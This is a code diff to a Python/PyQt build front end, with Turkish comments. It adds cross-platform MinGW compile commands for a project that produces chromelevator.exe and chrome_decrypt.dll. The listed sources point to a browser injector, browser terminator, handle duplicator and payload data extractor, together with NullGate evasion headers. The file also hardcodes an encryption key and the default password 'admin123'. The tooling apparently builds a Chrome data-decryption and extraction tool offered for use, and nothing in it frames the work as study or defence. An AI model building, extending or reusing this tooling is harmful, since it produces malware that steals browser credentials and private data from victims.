@@ -20,10 +20,9 @@ DEFAULT_PASSWORD = "admin123"  # Varsayılan şifre – menüden değiştirilebi
 NULLGATE_KEY = "FfqO3ZQ6XJ+SICAp"  # NullGate şifreleme anahtarı
 
 # ===================== DÜZELTİLMİŞ DERLEME KOMUTLARI =====================
-# ===================== DÜZELTİLMİŞ DERLEME KOMUTLARI =====================
+
 def get_linux_build_cmd(output_name):
     """Linux ortamında cross‑compile ile Windows exe üretir ve build/ klasörüne kaydeder."""
-    # Çıktı dosyasını doğrudan build klasörünün içine hedefler (Linux formatı: build/isim.exe)
     target_path = f"build/{output_name}"
     return (
         f'x86_64-w64-mingw32-g++ -std=c++23 -o {target_path} breakpointhevxi.cpp '
@@ -42,7 +41,6 @@ def get_linux_build_cmd(output_name):
 
 def get_windows_build_cmd(output_name):
     """Windows ortamında native MinGW ile exe üretir ve build\ klasörüne kaydeder."""
-    # Windows ortamı için ters bölü işaretiyle yolu birleştirir (build\isim.exe)
     target_path = f"build\\{output_name}"
     return (
         f'g++ -std=c++23 -o {target_path} breakpointhevxi.cpp '
@@ -59,7 +57,89 @@ def get_windows_build_cmd(output_name):
         f'-lbcrypt -liphlpapi -lcrypt32 -lsecur32'
     )
 
-BAT_FILE = "make.bat"
+def get_dll_build_cmd():
+    """
+    DLL COM Elevator2 projesini derlemek için uygun g++/mingw komutunu döndürür.
+    Platforma göre farklı komut üretir.
+    """
+    is_linux_cross = (sys.platform.startswith('linux') or sys.platform.startswith('darwin'))
+    
+    if is_linux_cross:
+        # Linux üzerinde cross-compile (Windows hedef)
+        compiler = 'x86_64-w64-mingw32-g++'
+        target_ext = '.exe'
+        out_name = 'chromelevator.exe'
+        # Kaynak dosyalar (örnek proje yapısına göre)
+        sources = (
+            'src/injector/injector_main.cpp '
+            'src/injector/browser_discovery.cpp '
+            'src/injector/browser_terminator.cpp '
+            'src/injector/process_manager.cpp '
+            'src/injector/pipe_server.cpp '
+            'src/injector/injector.cpp '
+            'src/com/elevator.cpp '
+            'src/sys/internal_api.cpp '
+            'src/crypto/chacha20.cpp '
+            'src/crypto/aes_gcm.cpp '
+            'src/payload/pipe_client.cpp '
+            'src/payload/data_extractor.cpp '
+            'src/payload/handle_duplicator.cpp '
+            'src/payload/payload_main.cpp '
+            'src/sys/bootstrap.cpp '
+        )
+        # Include ve lib yolları
+        includes = (
+            f'-I"{PROJECT_ROOT}/include" '
+            f'-I"{PROJECT_ROOT}/src" '
+            f'-I"{PROJECT_ROOT}/libs/sqlite" '
+            f'-I"{PROJECT_ROOT}/NullGate/include" '
+        )
+        libs = (
+            '-L. -Lbuild '
+            '-lsqlite3 -lbcrypt -lole32 -loleaut32 -lshell32 -lversion -lcomsuppw '
+            '-lcrypt32 -ladvapi32 -lkernel32 -luser32 -lntdll -lpsapi -lshlwapi '
+            '-lws2_32 -lgdi32 -lz -lbz2 -liphlpapi -lsecur32 '
+            '-static -O2'
+        )
+    else:
+        # Windows native
+        compiler = 'g++'
+        target_ext = '.exe'
+        out_name = 'chromelevator.exe'
+        sources = (
+            'src\\injector\\injector_main.cpp '
+            'src\\injector\\browser_discovery.cpp '
+            'src\\injector\\browser_terminator.cpp '
+            'src\\injector\\process_manager.cpp '
+            'src\\injector\\pipe_server.cpp '
+            'src\\injector\\injector.cpp '
+            'src\\com\\elevator.cpp '
+            'src\\sys\\internal_api.cpp '
+            'src\\crypto\\chacha20.cpp '
+            'src\\crypto\\aes_gcm.cpp '
+            'src\\payload\\pipe_client.cpp '
+            'src\\payload\\data_extractor.cpp '
+            'src\\payload\\handle_duplicator.cpp '
+            'src\\payload\\payload_main.cpp '
+            'src\\sys\\bootstrap.cpp '
+        )
+        includes = (
+            f'-I"{PROJECT_ROOT}\\include" '
+            f'-I"{PROJECT_ROOT}\\src" '
+            f'-I"{PROJECT_ROOT}\\libs\\sqlite" '
+            f'-I"{PROJECT_ROOT}\\NullGate\\include" '
+        )
+        libs = (
+            '-L. -Lbuild '
+            '-lsqlite3 -lbcrypt -lole32 -loleaut32 -lshell32 -lversion -lcomsuppw '
+            '-lcrypt32 -ladvapi32 -lkernel32 -luser32 -lntdll -lpsapi -lshlwapi '
+            '-lws2_32 -lgdi32 -lz -lbz2 -liphlpapi -lsecur32 '
+            '-static -O2'
+        )
+    
+    target = f'build/{out_name}' if is_linux_cross else f'build\\{out_name}'
+    cmd = f'{compiler} -std=c++23 -o {target} {sources} {includes} {libs}'
+    return cmd
 
 # ===================== BuildWorker SINIFI =====================
 class BuildWorker(QObject):
@@ -269,8 +349,8 @@ class MainWindow(QMainWindow):
                 "hw_linux": "🐧  Linux (cross-compile)",
                 "hw_windows": "🪟  Windows (native)",
                 "btn_build": "🔨  Derlemeyi Başlat",
-                "btn_dll_build": "⚙️  Projeyi Derle (make.bat)",
-                "dll_info": "🧩  DLL COM Elevator2 modu, make.bat dosyasını çalıştırarak tüm projeyi derler.\n📦  Çıktı: chromelevator.exe, chrome_decrypt.dll, vb.\n⚠️  Sadece Windows işletim sisteminde çalışır.",
+                "btn_dll_build": "⚙️  DLL Projesini Derle (g++/MinGW)",
+                "dll_info": "🧩  DLL COM Elevator2 modu, doğrudan g++/MinGW ile derlenir.\n📦  Çıktı: chromelevator.exe, chrome_decrypt.dll vb.\n🌍  Windows ve Linux (cross-compile) destekler.",
                 "hw_info": "💡  Çıktı dosyasının adını derleme sırasında belirleyebilirsiniz.",
                 "input_title": "Çıktı Dosyası Adı",
                 "input_label": "Derlenecek programın adını girin (örnek: myprogram.exe):",
@@ -322,8 +402,8 @@ class MainWindow(QMainWindow):
                 "hw_linux": "🐧  Linux (cross-compile)",
                 "hw_windows": "🪟  Windows (native)",
                 "btn_build": "🔨  Start Build",
-                "btn_dll_build": "⚙️  Build Project (make.bat)",
-                "dll_info": "🧩  DLL COM Elevator2 mode builds the entire project using make.bat.\n📦  Output: chromelevator.exe, chrome_decrypt.dll, etc.\n⚠️  Windows only.",
+                "btn_dll_build": "⚙️  Build DLL Project (g++/MinGW)",
+                "dll_info": "🧩  DLL COM Elevator2 mode builds directly with g++/MinGW.\n📦  Output: chromelevator.exe, chrome_decrypt.dll, etc.\n🌍  Supports Windows and Linux (cross-compile).",
                 "hw_info": "💡  You can specify the output filename during the build.",
                 "input_title": "Output Filename",
                 "input_label": "Enter the name of the program to build (e.g., myprogram.exe):",
@@ -611,15 +691,9 @@ class MainWindow(QMainWindow):
 
     def start_dll_build(self):
         s = self.strings[self.current_lang]
-        if sys.platform != "win32":
-            QMessageBox.critical(self, s["build_fail_title"], s["dll_only_windows"])
-            return
-
-        if not os.path.isfile(BAT_FILE):
-            QMessageBox.critical(self, s["build_fail_title"], s["dll_bat_missing"].format(BAT_FILE))
-            return
-
-        cmd = f'cmd /c "{BAT_FILE}"'
+        # Platform kontrolü: Linux'ta cross-compile yapabilir, Windows'ta native
+        # Her iki durumda da g++/mingw kullanılacak.
+        cmd = get_dll_build_cmd()
         self.start_build(cmd, "🧩  DLL COM Elevator2 derlemesi başlatılıyor...")
 
     def start_build(self, command, start_message):
